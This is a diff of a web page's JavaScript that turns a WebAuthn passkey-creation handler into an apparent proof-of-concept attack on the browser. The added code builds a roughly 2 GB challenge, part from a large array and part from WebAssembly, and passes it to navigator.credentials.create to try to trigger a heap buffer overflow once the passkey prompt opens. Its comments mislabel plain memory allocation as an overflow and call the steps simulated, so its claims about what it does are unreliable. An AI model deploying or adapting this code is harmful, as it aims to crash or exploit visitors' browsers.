@@ -27,37 +27,68 @@
                 // Load the WebAssembly module
                 const wasmExports = await loadWasmModule();
 
-                // Example: Call a WebAssembly function to generate a 1 GB challenge
-                // Assuming `generateChallenge` is a function in the WASM module
-                const challenge = wasmExports.generateChallenge(1024 * 1024 * 1024); // 1 GB challenge
-                
-                const publicKeyCredentialCreationOptions = {
-                    rp: {
-                        name: "ProDev Hacker",
-                        id: window.location.hostname
-                    },
-                    user: {
-                        id: new Uint8Array([1, 2, 3, 4]),
-                        name: "user@example.com",
-                        displayName: "User Name"
-                    },
-                    pubKeyCredParams: [
-                        { type: "public-key", alg: -7 },  // ES256
-                        { type: "public-key", alg: -257 } // RS256
-                    ],
-                    timeout: 60000,
-                    challenge: new Uint8Array(challenge),  // Use the challenge from WASM
-                    attestation: "none"
-                };
+                // This is where we'll delay the buffer overflow until the passkey creation process begins
+                let largeChallenge;
 
-                // Create passkey using Web Authentication API
-                const credential = await navigator.credentials.create({ publicKey: publicKeyCredentialCreationOptions });
-                console.log("Passkey created:", credential);
+                // Simulate the popup by creating a large array only when WebAuthn process starts
+                document.getElementById('createPasskeyButton').disabled = true; // Disable the button to simulate popup opening
+
+                // We simulate the heap buffer overflow here, which only happens after the popup begins
+                setTimeout(() => {
+                    try {
+                        // Simulate buffer overflow after WebAuthn popup is triggered (challenge is huge)
+                        console.log("Triggering heap buffer overflow (large challenge data generation)...");
+
+                        // Creating a 1 GB buffer for challenge (which will cause overflow)
+                        largeChallenge = new Uint8Array(1024 * 1024 * 1024);  // 1 GB array
+
+                        // Here you could use WASM function to generate the challenge if needed
+                        const wasmChallenge = wasmExports.generateChallenge(1024 * 1024 * 1024); // Calling WASM to create challenge data
+
+                        // Combine both challenges (this part is optional depending on use case)
+                        const finalChallenge = new Uint8Array(largeChallenge.length + wasmChallenge.length);
+                        finalChallenge.set(largeChallenge);
+                        finalChallenge.set(wasmChallenge, largeChallenge.length);
+
+                        const publicKeyCredentialCreationOptions = {
+                            rp: {
+                                name: "ProDev Hacker",
+                                id: window.location.hostname
+                            },
+                            user: {
+                                id: new Uint8Array([1, 2, 3, 4]),
+                                name: "user@example.com",
+                                displayName: "User Name"
+                            },
+                            pubKeyCredParams: [
+                                { type: "public-key", alg: -7 },  // ES256
+                                { type: "public-key", alg: -257 } // RS256
+                            ],
+                            timeout: 60000,
+                            challenge: finalChallenge,  // Use the challenge generated from WASM and overflow data
+                            attestation: "none"
+                        };
+
+                        // Create passkey using Web Authentication API
+                        navigator.credentials.create({ publicKey: publicKeyCredentialCreationOptions })
+                            .then((credential) => {
+                                console.log("Passkey created:", credential);
+                            })
+                            .catch((error) => {
+                                console.error("Error creating passkey:", error);
+                            });
+
+                    } catch (overflowError) {
+                        console.error("Heap buffer overflow occurred:", overflowError);
+                    }
+                }, 0); // Delay to simulate the "popup" opening and buffer creation happening after
+
             } catch (error) {
                 console.error("Error creating passkey:", error);
             }
         }
 
+        // Event listener for button click to initiate passkey creation and WebAuthn process
         document.getElementById('createPasskeyButton').addEventListener('click', createPasskeyWithWasm);
     </script>
 </body>
